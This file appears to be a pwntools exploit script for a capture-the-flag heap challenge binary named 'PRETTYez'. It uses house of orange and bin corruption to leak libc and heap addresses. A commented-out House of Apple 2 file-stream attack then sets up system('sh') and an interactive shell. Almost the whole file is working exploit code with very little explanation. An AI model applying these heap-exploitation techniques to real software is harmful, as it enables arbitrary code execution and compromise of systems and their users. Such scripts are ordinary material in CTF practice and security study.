#!/usr/bin/python3

from pwn import *

exe = ELF('PRETTYez_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        set resolve-heap-via-heuristic force
        # brva 0x1305
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)


def cr(size, pa):
    sla(b'>>', '1')
    sla(b'2.0x90 )', str(size))
    sa(b'INPUT:', pa)


def cr_1(size, pa):
    sla(b'>>', '1')
    sla(b'2.0x90 )', (size))
    sa(b'INPUT:', pa)


def sh(pa=str(2)):
    sla(b">>", pa)


def de(len=0):
    sla(b'>>', b'0'*len + b'3')


GDB()
# house of orange
de(0xd59-1)
cr(1, b"a" * 0x48 + p64(0xd11))
sh(b'0'*(0x1000-1) + b'2')
de()
# leak libc
cr(1, b'a'*0x50)
sh()
p.recvuntil(b'a'*0x50)
libc.crress = u64(p.recv(6) + b'\0\0') - 0x219ce0
info("libc.crress " + hex(libc.crress))
de()
cr(1, b'a'*0x40 + flat(0, 0xcf1))
de()
# leak heap
cr(2, b'a')
de()
cr(1, b'aaaa')
de()
cr(2, b'aaaa')
de()
cr(1, b'a'*0x50)
sh()
p.recvuntil(b'a'*0x50)
heap = (u64(p.recvline(keepends=False).ljust(8, b'\0')) << 12)
info("heap " + hex(heap))
de()
# unlink unsorted bin -> smallbin
cr(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap + 0x2c0)
   * 2 + b"a" * 0x10 + p64(0x30) + p64(0xd00))
de()
cr(2, b"a" * 0x60 + p64(0xa0) + p64(0x10) + p64(0x00) + p64(0x11))
de()

cr(1, flat({
    0x10: 0,
    0x18: 0xa1,
    0x20: heap + 0x390,
    0x28: libc.crress + 0x219ce0,
}, filler=b"\x00"))
sh(b'0'*(0x1000-1) + b'2')    
de()
cr(1, flat({
    0x10: {
        0x00: 0,
        0x08: 0xa1,
        0x10: heap + 0x2c0,
        0x18: heap + 0x2c0 + 0x30,
        
        0x30: 0,
        0x38: 0xa1,
        0x40: heap + 0x2c0,
        0x48: heap + 0x2c0 + 0x50,
        
        0x50: 0,
        0x58: 0xa1,
        0x60: heap + 0x2c0 + 0x30,
        0x68: libc.crress + 0x219d70
    }
}
    , filler=b"\x00"))
de()
cr(2, b"aaaa")
de()
# _IO_list_all = libc.crress + 0x21a680
# system = 0x50d60 + libc.crress

# fake_file = heap + 0x2e0
# # 见上文House of apple 2中解释
# cr(1, b"a" * 0x10 + p64(0) + p64(0x71) + p64((heap + 0x2d0 + 0x70) ^ ((heap) >> 12)))
# de()
# # 这里是布置House of apple 2
# cr(2, flat({
#     0x0 + 0x10: b"  sh;",
#     0x28 + 0x10: system,
#     0x68: 0x71,
#     0x70: _IO_list_all ^ ((heap) >> 12),
# }, filler=b"\x00"))
# de()
# cr(2, flat({
#     0xa0 - 0x60: fake_file - 0x10,
#     0xd0 - 0x60: fake_file + 0x28 - 0x68,
#     0xD8 - 0x60: libc.crress + 0x2160C0,  # jumptable
# }, filler=b"\x00"))
# de()
# cr(2, p64(fake_file))
# sleep(1)
# p.sendline(b"0")

# p.clean()
p.interactive()
